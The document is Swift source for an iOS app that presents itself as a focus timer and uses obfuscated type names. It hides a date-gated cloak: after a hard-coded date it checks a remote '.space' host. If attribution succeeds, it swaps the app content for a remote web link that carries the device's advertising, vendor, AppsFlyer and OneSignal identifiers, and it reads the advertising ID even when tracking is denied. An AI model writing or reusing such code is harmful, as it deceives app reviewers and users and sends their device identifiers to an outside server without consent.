import SwiftUI
import UserNotifications
import OneSignalFramework
import AppsFlyerLib
import AppTrackingTransparency
import AdSupport
import Combine
import Foundation
import AdServices


@main
struct FocusBeneathFigueiraApp: App {

    @State var isOpenCreate: Bool = false
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @StateObject private var timerManager = Fsadsdaxcx()
    
    var isLoading = false

    @State var presentAbout = false
    @State var presentMain = false
    
    var body: some Scene {
        WindowGroup {
            if(isLoading) {
                MainView()
            } else {
                CVsadasdasda()
                    .environmentObject(appDelegate.appData)
                    .onAppear {
                        if(appDelegate.appData.w != true && appDelegate.appData.g != true) {
                            timerManager.startTimer(appData: appDelegate.appData, appDelegate: appDelegate)
                        }
                    }
            }
            
        }
    }
}

class Fsadsdaxcx: ObservableObject {
    @Published var timeRemaining = 20

    func startTimer(appData: AppData, appDelegate: AppDelegate) {
        Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { timer in
            DispatchQueue.main.async {
                if appData.subs != "INITIAL" && appData.locationChecked == true {
                    let link = appDelegate.myLink + "?" + appDelegate.base + "=1"
                    let newLink = "\(link)&\(appData.subs)&deqsfsa=\(appData.IDFA)&rtqsdad=\(appData.UID)&sadweqq=\(appData.IDFV)&fsafsdaa=\(appData.IDFV)&adwerqsd=\(appData.osId)&fasfasda=\(appData.timeStamp)"
                    appDelegate.appData.link = newLink
                    appData.g = true
                    timer.invalidate()
                    UserDefaults.standard.set(newLink, forKey: "LINK")
                } else if self.timeRemaining <= 0 {
                    appData.subs = ""
                } else {
                    if appData.transperencyShown {
                        self.timeRemaining -= 2
                    }
                }
            }
        }
    }
}

struct CVsadasdasda: View {
    @EnvironmentObject var appData: AppData
    
    @State private var first = true
    @State private var second = true
    
    @State var presentAbout = true
    @State var presentMain = false

    var body: some View {
        if appData.w {
            if first {
                ZStack {
                    Image("max1")
                        .resizable()
                        .ignoresSafeArea()
                        .scaledToFill().onAppear {
                            DispatchQueue.main.asyncAfter(deadline: .now() + 1.9) {
                                first = false
                            }
                        }
                }
            } else if second {
                ZStack {
                    Image("max2")
                        .resizable()
                        .ignoresSafeArea()
                        .scaledToFill().onAppear {
                            DispatchQueue.main.asyncAfter(deadline: .now() + 1.9) {
                                second = false
                            }
                        }
                }
            } else {
                MainView()
            }
     
        } else if appData.g {
            Fsadadsda(formedUrl: appData.link, stamp: appData.timeStamp, base: appData.base, shouldSendPush: appData.shuldSendPush)
        } else {
            ZStack {
                Image("max1")
                    .resizable()
                    .ignoresSafeArea()
                    .scaledToFill()
            }
        }
    }
}



class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate {
    
    var appData = AppData()
    
    var ONESIGNAL_APP_ID = "ca559a6a-f6ed-458d-991d-740f9c301cfd"
    
    var AF_DEV_KEY = "SaD7GwYCXEMiVeyH3UnWZ4"
    
    var APPLE_APP_ID = "6741431955"
    
    var myLink = "https://brilliant-cool-contentment.space/bVc5TfJ1"
    
    var base = "bVc5TfJ1"
    
    func isToEarly() -> Bool {
        let currentDate = Date()
        let comparisonDateComponents = DateComponents(year: 2025, month: 2, day: 21, hour: 9, minute: 44)
        let comparisonDate = Calendar.current.date(from: comparisonDateComponents)!
        if currentDate < comparisonDate {
            return true
        } else {
            return false
        }
    }
    
    class MyNotificationClickListener : NSObject, OSNotificationClickListener {
        
        private let appData: AppData

            init(appData: AppData) {
                self.appData = appData
            }
        
        func sendEvent(eventName: String, timestamp: String, url: String) {
            guard let newUrl = URL(string: "\(url)?dasfsa=\(eventName)&fasfasda=\(timestamp)") else {
                    return
                }
                var request = URLRequest(url: newUrl)
                request.httpMethod = "GET"
      
                let task = URLSession.shared.dataTask(with: request) { _, _, _ in
                }
                            task.resume()
        }

        
        
        func onClick(event: OSNotificationClickEvent) {
            let _: OSNotification = event.notification
            let result: OSNotificationClickResult = event.result
            _ = result.actionId
            _ = result.url
            let timestamp = UserDefaults.standard.string(forKey: "TIMESTAMP_USE_ID_KEY") ?? ""
            let newUrl = UserDefaults.standard.string(forKey: "LINK") ?? "NO"
            let newNewUrl = newUrl+"&resq=true"
                
            if (result.url == nil) {
                sendEvent(eventName: "push_open_webview", timestamp: appData.timeStamp, url: appData.base)
            } else {
                sendEvent(eventName: "push_open_browser", timestamp: appData.timeStamp, url: appData.base)
            }
            appData.timeStamp = timestamp
            appData.link = newNewUrl
            appData.g = true
        
        }
    }
    
    func saveStringToStorage(value: String) {
        UserDefaults.standard.set(value, forKey: "LINK")
    }
    
    func isLocationCorrect() async -> Bool {
        let baseUrl = myLink
        guard let url = URL(string: baseUrl) else {
            return false
        }
        
        do {
            let (_, response) = try await URLSession.shared.data(from: url)
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                return true
            } else {
                return false
            }
        } catch {
            return false
        }
    }

    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        
        OneSignal.initialize(ONESIGNAL_APP_ID)
        OneSignal.Notifications.addClickListener(MyNotificationClickListener(appData: self.appData))
        
        AppsFlyerLib.shared().appsFlyerDevKey = AF_DEV_KEY
        AppsFlyerLib.shared().appleAppID = APPLE_APP_ID
        AppsFlyerLib.shared().isDebug = false
        AppsFlyerLib.shared().delegate = self
        
        if isToEarly() {
            NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("sendWLaunch"), name: UIApplication.didBecomeActiveNotification, object: nil)
            appData.w = true
            return true
        }
        
        appData.link = myLink
        appData.base = myLink
        
        if isNotFirstOpen() {
            let link = loadStringFromStorage()
            if link == "NO" {
                NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("sendWLaunch"), name: UIApplication.didBecomeActiveNotification, object: nil)
                appData.w = true
                return true
            } else {
                let timestamp = getTimestamp()
                appData.link = link
                appData.timeStamp = timestamp
                appData.g = true
                return true
            }
        } else {
            generateTimeStamp()
            OneSignal.User.addTag(key: "timestamp_user_id", value: appData.timeStamp)
            sendEvent(eventName: "uniq_visit", timestamp: appData.timeStamp, url: myLink)
            saveFirstOpen(value: true)
            appData.shuldSendPush = true
            _Concurrency.Task {
                await handleLocationLogic()
            }
        }
        
        NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("sendWLaunch"), name: UIApplication.didBecomeActiveNotification, object: nil)
        return true
    }

    
    private func handleLocationLogic() async {
        let result = await isLocationCorrect()
        if result {
            if let idfv = UIDevice.current.identifierForVendor?.uuidString {
                self.appData.IDFV = idfv
                AppsFlyerLib.shared().customerUserID = idfv
            }
            let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
            self.appData.UID = appsFlyerUID
            self.appData.locationChecked = true
        } else {
            self.appData.w = true
        }
    }

    
    

    func generateTimeStamp() {
        let timeStamp = Int(Date().timeIntervalSince1970 * 1000)
        let userRandomId = Int.random(in: 1000000...9999999)
        let timestampUserId = "\(timeStamp)-\(userRandomId)"
        appData.timeStamp = timestampUserId
        let userDefaults = UserDefaults.standard
        userDefaults.set(timestampUserId, forKey: "TIMESTAMP_USE_ID_KEY")
    }
    
    func getTimestamp() -> String {
        return UserDefaults.standard.string(forKey: "TIMESTAMP_USE_ID_KEY") ?? ""
    }


    func loadStringFromStorage() -> String {
        return UserDefaults.standard.string(forKey: "LINK") ?? "NO"
    }
    
    func saveFirstOpen(value: Bool) {
        UserDefaults.standard.set(value, forKey: "FIRST_OPEN")
    }

    func isNotFirstOpen() -> Bool {
        return UserDefaults.standard.bool(forKey: "FIRST_OPEN")
    }
    
    func sendEvent(eventName: String, timestamp: String, url: String) {
        guard let newUrl = URL(string: "\(url)?dasfsa=\(eventName)&fasfasda=\(timestamp)") else {
                return
            }
            var request = URLRequest(url: newUrl)
            request.httpMethod = "GET"
  
            let task = URLSession.shared.dataTask(with: request) { _, _, _ in
            }
                        task.resume()
    }

    
 
    
    @objc func sendWLaunch() {
        requestTrackingPermission { [self] in
            
     
            AppsFlyerLib.shared().start()
            if let osId = OneSignal.User.onesignalId {
                self.appData.osId = osId
            }
            self.appData.transperencyShown = true
        }
        
        
    }
    
    func requestTrackingPermission(completion: @escaping () -> Void) {
        let status = ATTrackingManager.trackingAuthorizationStatus
        switch status {
        case .notDetermined:
            ATTrackingManager.requestTrackingAuthorization { newStatus in
                completion()
            }
        case .authorized:
            let IDFA = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            DispatchQueue.main.async {
                self.appData.IDFA = IDFA
            }
            completion()
        case .denied, .restricted:
            let IDFA = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            DispatchQueue.main.async {
                self.appData.IDFA = IDFA
            }
            completion()
        @unknown default:
            completion()
        }
    }
    
    func convertSubs(inputSubs: String?) -> String {
        do {
            if (inputSubs == nil) {
                throw MyError.invalidInput
            }
            
            if (inputSubs!.contains("_") == false) {
                return ""
            }
            
            let subList = inputSubs!.split(separator: "_")
            
            var outputSubs = ""
            
            for (index, sub) in subList.enumerated() {
                outputSubs += "swed_\(index + 1)=\(sub)"
                if index < subList.count - 1 {
                    outputSubs += "&"
                }
            }
            return outputSubs
        } catch {
            return ""
        }
    }
    
    
    func onConversionDataSuccess(_ installData: [AnyHashable: Any]) {
        if let status = installData["af_status"] as? String {
            if status == "Non-organic" {
                if let campaign = installData["campaign"] as? String {
                    DispatchQueue.main.async { [self] in
                        self.appData.subs = convertSubs(inputSubs: campaign)
                    }
                } else {
                    self.appData.subs = ""
                }
            } else {
                do {
                   try sendAttributionToken()
                } catch {
                    DispatchQueue.main.async { [self] in
                        self.appData.subs = ""
                    }
                }
            }
        } else {
            DispatchQueue.main.async { [self] in
                self.appData.subs = ""
            }
        }
    }
    
    func sendAttributionToken() throws {
        let token = try AAAttribution.attributionToken()
        if token.isEmpty {
            DispatchQueue.main.async { [self] in
                self.appData.subs = ""
            }
            return
        }
        guard let url = URL(string: "https://api-adservices.apple.com/api/v1/") else {
            DispatchQueue.main.async { [self] in
                self.appData.subs = ""
            }
                return
            }
        var request = URLRequest(url: url)
           request.httpMethod = "POST"
           request.addValue("text/plain", forHTTPHeaderField: "Content-Type")
           request.httpBody = token.data(using: .utf8)
        
        let session = URLSession.shared
            let task = session.dataTask(with: request) { data, response, error in
                if let error = error {
                    self.appData.subs = ""
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    if httpResponse.statusCode == 200 {
                    } else {
                        self.appData.subs = ""
                        return
                    }
                }
                
                if let data = data {
                    if let jsonObject = try? JSONSerialization.jsonObject(with: data, options: []),
                       let jsonDict = jsonObject as? [String: Any] {
                        
                        if let attribution = jsonDict["attribution"] as? Bool {
                            if attribution {
                                self.appData.subs = "swed_1=asa"
                            } else {
                                self.appData.subs = ""
                            }
                        } else {
                            self.appData.subs = ""
                        }
                    } else {
                        self.appData.subs = ""
                    }
                } else {
                    self.appData.subs = ""
                }

            }
            task.resume()
        
    }


    
    func onConversionDataFail(_ error: Error) {
    
    }
}



class AppData: ObservableObject {
    @Published var subs = "INITIAL"
    @Published var osId = "INITIAL"
    @Published var IDFA = "INITIAL"
    @Published var UID = "INITIAL"
    @Published var all = "false"
    @Published var transperencyShown = false
    @Published var IDFV = "INITIAL"
    @Published var w = false
    @Published var g = false
    @Published var link = ""
    @Published var timeStamp = ""
    @Published var base = ""
    @Published var locationChecked = false
    @Published var shuldSendPush = false
}

enum MyError: Error {
    case invalidInput
}

